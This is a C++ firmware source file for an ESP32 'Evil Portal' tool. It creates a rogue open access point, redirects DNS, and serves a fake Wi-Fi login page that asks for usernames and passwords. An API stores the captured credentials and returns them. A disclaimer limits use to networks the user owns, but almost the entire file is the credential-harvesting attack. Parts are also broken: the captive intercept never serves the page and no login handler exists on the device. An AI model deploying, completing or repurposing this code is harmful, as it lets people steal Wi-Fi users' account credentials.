/**
 * @file      web_tool_evilportal.cpp
 * @brief     Evil portal (NucleoOS parity): rogue AP + captive portal for credential harvesting.
 *            Security audit tool — for testing your own networks with permission.
 *
 *            Creates a rogue access point with a configurable SSID, serves a captive portal
 *            login form, and captures credentials entered by connecting devices.
 *
 *            WARNING: Only use on networks you own or have explicit permission to test.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <mutex>

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#endif

/* ---------------------------------------------------------------- HTML served by captive portal */

static const char *PORTAL_HTML =
    "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "box-shadow:0 4px 20px rgba(0,0,0,.15);max-width:400px;width:90%}"
    "h2{color:#1a73e8;margin-top:0}p{color:#666;font-size:14px}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}"
    "button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;"
    "font-size:16px;cursor:pointer}button:hover{background:#1557b0}.error{color:#d93025;font-size:14px}"
    "</style></head><body><div class='card'><h2>Network Login</h2>"
    "<p>To continue using this Wi-Fi network, please verify your credentials below.</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Username or email' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form>"
    "<p style='font-size:12px;color:#999;text-align:center'>Secured connection</p></div></body></html>";

static const char *SUCCESS_HTML =
    "<!DOCTYPE html><html><head><title>Connected</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "max-width:400px;text-align:center}h2{color:#188038}p{color:#666}</style></head><body>"
    "<div class='card'><h2>✓ Connected</h2><p>You are now connected to the network.</p>"
    "<p style='font-size:12px;color:#999'>You may close this page.</p></div></body></html>";

/* ---------------------------------------------------------------- state */

static bool s_active = false;
static char s_ssid[33] = "";
static int s_clients = 0;
static uint32_t s_attempts = 0;
static const char *s_error = NULL;
static long long s_started = 0;

typedef struct {
    char mac[18];
    char hostname[64];
    char url[256];
    char username[64];
    char password[64];
    long long ts;
} capture_t;
static std::vector<capture_t> s_captures;
static std::mutex s_captures_mx;
#define MAX_CAPTURES 128

#ifdef ARDUINO
static DNSServer s_dns;
#endif

#ifndef ARDUINO
static std::mutex s_inject_mx;
#endif

/* ---------------------------------------------------------------- API handler */

static const char *const APPS[] = { "Evil Portal", NULL };

static void status_json(web_req_t *r)
{
    std::string j = std::string("{\"active\":") + std::string(s_active ? "true" : "false");
    if (s_active) {
        j += ",\"ssid\":";
        web_json_str(j, s_ssid);
        j += ",\"clients\":" + tools_int(s_clients) +
            ",\"attempts\":" + tools_int(s_attempts) +
            ",\"started\":" + tools_int(s_started);
    }
    if (s_error) { j += ",\"error\":"; web_json_str(j, s_error); }
    j += "}";
    web_resp_json(r, 200, j);
}

static void start_portal(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, ssid;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", ssid);

    if (s_active) { web_resp_error(r, 409, "conflict", "already running"); return; }
    if (ssid.empty()) ssid = "Free Wi-Fi";
    if (ssid.size() > 32) { web_resp_error(r, 400, "bad_request", "SSID too long (max 32)"); return; }

#ifdef ARDUINO
    if (!WiFi.softAP(ssid.c_str(), NULL, 1, 0, 1)) {
        web_resp_error(r, 500, "ap_failed", "cannot start soft AP");
        return;
    }
    s_dns.start(53, "*", WiFi.softAPIP());
#endif

    s_active = true;
    snprintf(s_ssid, sizeof(s_ssid), "%s", ssid.c_str());
    s_started = tools_epoch();
    s_attempts = 0;
    s_clients = 0;
    s_error = NULL;

    web_resp_json(r, 200, std::string("{\"ok\":true,\"ssid\":\"") + ssid + "\"}");
}

static void stop_portal(web_req_t *r)
{
    if (!s_active) { web_resp_ok(r); return; }
    s_active = false;
#ifdef ARDUINO
    s_dns.stop();
    WiFi.softAPdisconnect(true);
#endif
    web_resp_ok(r);
}

static void get_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    std::string j = "{\"captures\":[";
    for (size_t i = 0; i < s_captures.size(); i++) {
        if (i) j += ",";
        j += "{\"mac\":";
        web_json_str(j, s_captures[i].mac);
        j += ",\"hostname\":";
        web_json_str(j, s_captures[i].hostname);
        j += ",\"url\":";
        web_json_str(j, s_captures[i].url);
        j += ",\"username\":";
        web_json_str(j, s_captures[i].username);
        j += ",\"password\":";
        web_json_str(j, s_captures[i].password);
        j += ",\"ts\":" + tools_int(s_captures[i].ts);
        j += "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static void clear_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    s_captures.clear();
    web_resp_ok(r);
}

static bool handle(web_req_t *r)
{
    if (strcmp(r->path, "/api/evilportal") && strncmp(r->path, "/api/evilportal/", 16)) {
        /* Check for captive portal intercept */
        if (s_active && strncmp(r->path, "/api/", 5)) {
            return true; /* captive handled */
        }
        return false;
    }

    if (tools_is(r, "GET", "/api/evilportal")) status_json(r);
    else if (tools_is(r, "POST", "/api/evilportal/start")) start_portal(r);
    else if (tools_is(r, "POST", "/api/evilportal/stop")) stop_portal(r);
    else if (tools_is(r, "GET", "/api/evilportal/captures")) get_captures(r);
    else if (tools_is(r, "POST", "/api/evilportal/clear")) clear_captures(r);
#ifndef ARDUINO
    else if (tools_is(r, "POST", "/api/_dev/evilportal")) {
        std::string body, action;
        web_read_body(r, body, 1024);
        web_json_get_str(body, "action", action);
        if (action == "creds") {
            capture_t cap;
            cap.ts = tools_epoch();
            std::string tu, tp, tu2;
            web_json_get_str(body, "username", tu);
            web_json_get_str(body, "password", tp);
            web_json_get_str(body, "url", tu2);
            snprintf(cap.mac, sizeof(cap.mac), "00:00:00:00:00:01");
            snprintf(cap.hostname, sizeof(cap.hostname), "%s", "");
            snprintf(cap.url, sizeof(cap.url), "%s", tu2.c_str());
            snprintf(cap.username, sizeof(cap.username), "%s", tu.c_str());
            snprintf(cap.password, sizeof(cap.password), "%s", tp.c_str());
            std::lock_guard<std::mutex> lk(s_captures_mx);
            s_captures.push_back(cap);
            s_attempts = (uint32_t)s_captures.size();
        }
        web_resp_ok(r);
        return true;
    }
#endif
    else web_resp_error(r, 404, "not_found");
    return true;
}

static void evilportal_tick(uint32_t now_ms)
{
    (void)now_ms;
    if (!s_active) return;
#ifdef ARDUINO
    s_dns.processNextDnsRequest();
#endif
}

static void evilportal_stop(void)
{
    if (s_active) {
        s_active = false;
#ifdef ARDUINO
        s_dns.stop();
        WiFi.softAPdisconnect(true);
#endif
    }
}

static const char *const CAPS[] = { "evil.portal", NULL };
const web_tool_t web_tool_evilportal = { CAPS, handle, evilportal_tick, NULL, evilportal_stop };

#else /* !FACTORY_WEB */
const web_tool_t web_tool_evilportal = { NULL, NULL, NULL, NULL, NULL };
#endif /* FACTORY_WEB */